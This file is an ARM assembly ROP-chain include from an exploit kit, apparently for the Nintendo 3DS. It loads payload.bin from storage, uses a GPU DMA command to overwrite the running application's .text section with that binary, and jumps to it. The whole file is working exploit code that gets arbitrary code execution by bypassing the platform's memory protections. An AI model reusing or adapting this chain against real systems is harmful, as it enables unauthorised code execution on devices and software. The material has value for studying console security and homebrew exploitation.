#pragma once

@ This is intended to be included by a regular-application exploit .s.

#ifndef ROPKIT_TMPDATA
	#define ROPKIT_TMPDATA 0x0FFF0000
#endif

#define ropkit_IFile_ctx (ROPKIT_TMPDATA+4)

#ifndef ROPKIT_BINLOAD_ADDR
	#define ROPKIT_BINLOAD_ADDR ROPKIT_LINEARMEM_BUF
#endif

#ifndef ROPKIT_BINLOAD_SIZE
	#define ROPKIT_BINLOAD_SIZE 0xC000
#endif

#ifndef ROPKIT_BINPAYLOAD_PATH
	#define ROPKIT_BINPAYLOAD_PATH "data:/payload.bin"
#endif

#ifndef ROPKIT_OTHERAPP_NEWSP_ADDR
	#define ROPKIT_OTHERAPP_NEWSP_ADDR (0x10000000-4)
#endif

#ifdef ROPKIT_MOUNTSD
CALLFUNC_NOSP FS_MountSdmc, (ROPBUF + (ropkit_sd_archivename - _start)), 0, 0, 0
#endif

@ Load the file into the buffer.

CALLFUNC_NOSP IFile_Open, ropkit_IFile_ctx, (ROPBUF + (ropkit_sdfile_path - _start)), 1, 0

CALLFUNC_NOSP IFile_Read, ropkit_IFile_ctx, ROPKIT_TMPDATA, ROPKIT_BINLOAD_ADDR, ROPKIT_BINLOAD_SIZE
COND_THROWFATALERR

ROPMACRO_IFile_Close ropkit_IFile_ctx

@ Copy APPMEMTYPE to ROPKIT_TMPDATA+0x24.
ROPMACRO_COPYWORD (ROPKIT_TMPDATA+0x24), 0x1FF80030

@ Copy the above tmpdata to the value words used in each of the below add-macros.
ROPMACRO_COPYWORD (ROPBUF + (ropkit_appmemtype_addstart0 - _start) + ROPMACRO_LDDRR0_ADDR1_STRADDR_VALUEOFFSET), (ROPKIT_TMPDATA+0x24)
ROPMACRO_COPYWORD (ROPBUF + (ropkit_appmemtype_addstart1 - _start) + ROPMACRO_LDDRR0_ADDR1_STRADDR_VALUEOFFSET), (ROPKIT_TMPDATA+0x24)
ROPMACRO_COPYWORD (ROPBUF + (ropkit_appmemtype_addstart2 - _start) + ROPMACRO_LDDRR0_ADDR1_STRADDR_VALUEOFFSET), (ROPKIT_TMPDATA+0x24)

@ These 3 add-macros calculate the offset to use in the ropkit_appmemtype_appmemsize_table by multiplying APPMEMTYPE loaded above by 4 basically.

ropkit_appmemtype_addstart0:
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x24), (ROPKIT_TMPDATA+0x24), 0

ropkit_appmemtype_addstart1:
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x24), (ROPKIT_TMPDATA+0x24), 0

ropkit_appmemtype_addstart2:
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x24), (ROPKIT_TMPDATA+0x24), 0

@ Calculate the address in the table to use, by adding with the table start address.
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x24), (ROPKIT_TMPDATA+0x24), (ROPBUF + (ropkit_appmemtype_appmemsize_table - _start))

@ r0 = *(ROPKIT_TMPDATA+0x24)
ROP_LOADR0_FROMADDR (ROPKIT_TMPDATA+0x24)

@ *(ROPKIT_TMPDATA+0x28) = *r0. Hence, *(ROPKIT_TMPDATA+0x28) = word value from the table.
ROPMACRO_COPYWORD_FROMR0 (ROPKIT_TMPDATA+0x28)

@ Calculate the linearmem dst addr.
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x28), (ROPKIT_TMPDATA+0x28), ((ROPKIT_LINEARMEM_REGIONBASE - ROPKIT_APPMEMEND_TEXT_OFFSET) + 0x1000)

@ Write the codebin into .text.

CALL_GXCMD4_LDRDST ROPKIT_LINEARMEM_BUF, (ROPKIT_TMPDATA+0x28), ROPKIT_BINLOAD_SIZE

@ Wait 0.1s for the transfer to finish.
CALLFUNC_R0R1 svcSleepThread, 100000000, 0

@ Setup the paramblk.

CALLFUNC_NOSP MEMSET32_OTHER, ROPKIT_LINEARMEM_BUF, 0x1000, 0, 0

ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_BUF + 0x1c), GXLOW_CMD4
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_BUF + 0x20), GSPGPU_FlushDataCache
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_BUF + 0x48), 0x8d @ Flags
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_BUF + 0x58), GSPGPU_SERVHANDLEADR

@ Jump to the payload.
CALLFUNC_R0R1 0x00101000, ROPKIT_LINEARMEM_BUF, ROPKIT_OTHERAPP_NEWSP_ADDR

.word 0x40506070

#ifdef ROPKIT_MOUNTSD
ropkit_sd_archivename:
.string "sd:"
.align 2
#endif

ropkit_sdfile_path:
.string16 ROPKIT_BINPAYLOAD_PATH
.align 2

ropkit_appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-region size, for each APPMEMTYPE.
.word 0x04000000 @ type0
.word 0x04000000 @ type1
.word 0x06000000 @ type2
.word 0x05000000 @ type3
.word 0x04800000 @ type4
.word 0x02000000 @ type5
.word 0x07C00000 @ type6
.word 0x0B200000 @ type7

